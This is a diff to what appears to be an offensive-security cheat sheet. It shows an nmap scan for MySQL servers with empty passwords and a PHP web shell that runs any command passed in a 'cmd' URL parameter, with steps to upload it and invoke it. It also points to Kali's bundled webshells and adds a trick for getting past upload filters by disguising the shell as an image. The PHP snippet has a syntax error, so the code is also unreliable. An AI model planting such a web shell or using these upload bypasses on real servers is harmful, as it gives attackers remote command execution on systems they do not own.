@@ -64,6 +64,7 @@
 - __```sudo nmap -sS -sV --script mysql-empty-password -p 3306 120.0.0.1```__
 
 ## Arbitrary File Upload 
+#### 1
 ```php
 <?php
 $output = shell_exec($_GET(["cmd"]);
@@ -73,9 +74,11 @@ echo "<pre>$output</pre>";
 - > __save it as shell.php and upload this file in webserver__
 - > __<url>/shell.php?cmd=id__
 
+#### 2
 - __You can use perdefine webshells__
   - __```ls -al /usr/share/webshells/php```__
- 
+
+ #### 3
 - __If file upload restricts PHP file types, rename shell.php to an image extension like shell.jpg. Simply visiting `<url>/shell.jpg` won’t execute the PHP script. To run the script, append `/shell.php` to the URL: `<url>/shell.jpg/shell.php.`__
 
 
